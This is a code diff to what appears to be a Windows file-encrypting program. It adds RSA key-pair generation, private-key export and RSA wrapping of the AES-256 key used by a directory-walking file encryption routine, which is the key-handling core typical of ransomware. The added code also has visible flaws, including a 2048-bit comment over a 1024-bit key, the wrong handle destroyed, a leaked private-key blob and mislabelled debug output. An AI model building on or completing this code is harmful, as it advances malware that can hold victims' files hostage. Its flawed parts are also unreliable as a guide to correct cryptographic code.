@@ -1,9 +1,11 @@
 #include<windows.h>
 #include <strsafe.h>
+#include<wincrypt.h>
 #include"aes.h"
 #include"common.h"
 #include <stdio.h>
 
+#pragma comment(lib,"advapi32.lib");
 
 #define AES_256_KEY_SIZE  32 
 #define IV_SIZE    16  
@@ -291,6 +293,26 @@ BOOL GenerateKey(uint8_t* keyValue, uint8_t* iv) {
 	}
 
 	bSuccess = TRUE;
+
+
+	printf("key before enc: \n");
+	
+	for (int i = 0;i < AES_256_KEY_SIZE; i++) {
+		printf("%02X ", keyValue[i]);
+	}
+	
+	printf("\n");
+		
+	HCRYPTKEY thKey;
+	SIZE_T szCipher = AES_256_KEY_SIZE;
+	PBYTE testmem = NULL;
+	GenerateKeyPairs(&hProv,&thKey);
+	
+	ExportRSAkeys(hProv, thKey);
+	EncryptAESKey(thKey, pbBlob + 12, &szCipher,&testmem);
+	DecryptAESKey(thKey, testmem, &szCipher);
+	CryptDestroyKey(hKey);
+
 
 _EndFunction:
 	if (pbBlob) {
@@ -696,3 +718,117 @@ BOOL DirectoryFiles(WCHAR* pDirectoryPath,uint8_t* key, uint8_t* iv) {
 	return TRUE;
 }
 
+BOOL GenerateKeyPairs(HCRYPTPROV* phCryptProv, HCRYPTKEY* phKey) {
+
+	HCRYPTPROV hCryptProv;
+	HCRYPTKEY hKey;
+
+
+
+		// Acquire a cryptographic provider context handle
+		if (!CryptAcquireContext(&hCryptProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
+			printf("Error %u acquiring cryptographic context\n", GetLastError());
+			return FALSE;
+		}
+
+		// Generate the RSA key pair (2048-bit)
+		if (!CryptGenKey(hCryptProv, AT_KEYEXCHANGE, RSA1024BIT_KEY | CRYPT_EXPORTABLE, &hKey)) {
+			printf("Error %u generating RSA key pair\n", GetLastError());
+			CryptReleaseContext(hCryptProv, 0);
+			return FALSE;
+		}
+
+		printf("RSA key pair generated successfully!\n");
+
+		
+		*phCryptProv = hCryptProv;
+		*phKey = hKey;
+
+		return TRUE;
+	}
+
+BOOL ExportRSAkeys(HCRYPTPROV hCryptProv, HCRYPTKEY hKey) {
+	DWORD keyLen = 0;
+	PBYTE pbKeyBlob = NULL;
+	BOOL result = FALSE;
+
+	if (!CryptExportKey(hKey, NULL, PRIVATEKEYBLOB, 0, NULL, &keyLen)) {
+		return FALSE;
+	}
+
+
+	pbKeyBlob = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, keyLen);
+	if (pbKeyBlob == NULL) {
+		return FALSE;
+	}
+
+
+	result = CryptExportKey(hKey, NULL, PRIVATEKEYBLOB, 0, pbKeyBlob, &keyLen);
+
+
+	return result;
+}
+
+BOOL EncryptAESKey(HCRYPTKEY hKey, BYTE* key, SIZE_T* keySize,BYTE** cipher) {
+	DWORD cipherTextLen = (DWORD)(*keySize);
+	DWORD dataLen = 0;
+	PBYTE pbBlob = NULL;
+	BOOL result = FALSE;
+
+	printf("Key before encryption:\n");
+	for (DWORD i = 0; i < *keySize; i++) {
+		printf("%02X ", key[i]);
+	}
+	printf("\n");
+
+	if (!CryptEncrypt(hKey, NULL, TRUE, 0, NULL, &cipherTextLen, 0)) {
+		printf("Error determining buffer size: %d\n", GetLastError());
+		return FALSE;
+	}
+
+	pbBlob = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cipherTextLen);
+	if (!pbBlob) {
+		printf("Memory allocation failed\n");
+		return FALSE;
+	}
+
+	memcpy(pbBlob, key, *keySize);
+	dataLen = (DWORD)*keySize;
+
+	result = CryptEncrypt(hKey, NULL, TRUE, 0, pbBlob, &dataLen, cipherTextLen);
+	if (!result) {
+		printf("Encryption error: %d\n", GetLastError());
+		HeapFree(GetProcessHeap(), 0, pbBlob);
+		return FALSE;
+	}
+
+	printf("Key after encryption:\n");
+	for (DWORD i = 0; i < dataLen; i++) {
+		printf("%02X ", pbBlob[i]);
+	}
+	printf("\n");
+
+	*keySize = dataLen;
+	*cipher = pbBlob;
+	
+
+	return TRUE;
+}
+
+BOOL DecryptAESKey(HCRYPTKEY hKey, BYTE* key, SIZE_T* keySize){
+	
+	DWORD cipherTextLen = (DWORD)(*keySize);
+	if (!CryptDecrypt(hKey, NULL, TRUE, 0, key, &cipherTextLen)) {
+		printf("error %d\n",GetLastError());
+		return FALSE;
+	}
+
+	printf("Key before encryption:\n");
+	for (DWORD i = 0; i < cipherTextLen; i++) {
+		printf("%02X ", key[i]);
+	}
+	printf("\n");
+
+	return TRUE;
+
+}
